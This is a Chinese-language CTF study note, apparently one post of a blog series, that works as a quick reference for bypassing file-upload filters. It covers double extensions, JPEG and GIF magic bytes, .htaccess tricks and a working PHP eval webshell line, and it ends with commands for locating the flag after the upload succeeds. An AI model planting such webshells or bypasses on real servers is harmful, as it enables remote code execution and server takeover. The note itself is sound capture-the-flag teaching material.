---
title: "99-5 上传绕过速查"
published: 2026-09-16
description: "文件上传「三张牌」+ 三条硬规矩 + 找 flag 的固定三连，一页看完就能上手。"
tags: ["CTF","学习笔记","工具箱","文件上传"]
category: 学习笔记
draft: false
---

> **CTF Web 学习笔记**（共 19 篇）　[📖 系列总览](/posts/ctf-learning/00-overview/)　·　[← 99-4 编码与魔法哈希](/posts/ctf-learning/99-4-encoding/)　·　[99-6 报错对照表 →](/posts/ctf-learning/99-6-errors/)

## 文件上传「三张牌」速查

**先问一句：服务器到底在查什么？** 传一个故意违规的文件看回显。

| 牌 | 内容 | 什么时候出 |
|---|---|---|
| 🃏 **后缀** | `shell.php` / **`shell.php.jpg`** / `shell.phtml` | 目标不查后缀，或只查最后一段 |
| 🃏 **魔数** | 木马前加 `\xff\xd8\xff`（JPEG）或 `GIF89a` | 目标查文件头 |
| 🃏 **`.htaccess`** | 传配置让 `.jpg` 当 PHP 跑 | **只查后缀黑名单**、且允许它落地生效 |

**万能组合**（同时查后缀和魔数时）：

```
文件名: yiju.php.jpg
内容:   \xff\xd8\xff<?php @eval($_POST['cmd']);?>
```

| 目标查什么 | 用什么 |
|---|---|
| 只查魔数 | `shell.php` |
| 只查后缀黑名单 | `.htaccess`（⚠️ 前提多，见 10 篇） |
| 后缀必须 .jpg **且** 查魔数 | **`yiju.php.jpg`** |
| 查得很严（真解析图片内容） | 换思路：`.user.ini`、解析漏洞、条件竞争 |

**⚠️ 三条硬规矩**：

1. **`\xff\xd8\xff` 和 `.htaccess` 不能共存** —— 加了魔数，Apache 就解析失败，整个目录 **500**（且**没法用同一个上传接口修回来**）
2. **验证执行要用"源码里不存在的值"**（如 `echo 7*7` 看有没有 `49`），别 `echo "MARK"` —— 源码里也有这个字符串，会假阳性
3. **PHP 8 里木马必须写 `$_POST['cmd']`**（加引号），裸词 `$_POST[cmd]` 会抛 Error

**做完上传题后找 flag 的固定三连**：

```bash
id                # 我是谁
ls -la /          # 根目录有什么
cat /flag*        # 读 flag（文件名常带随机串，用通配符）
```
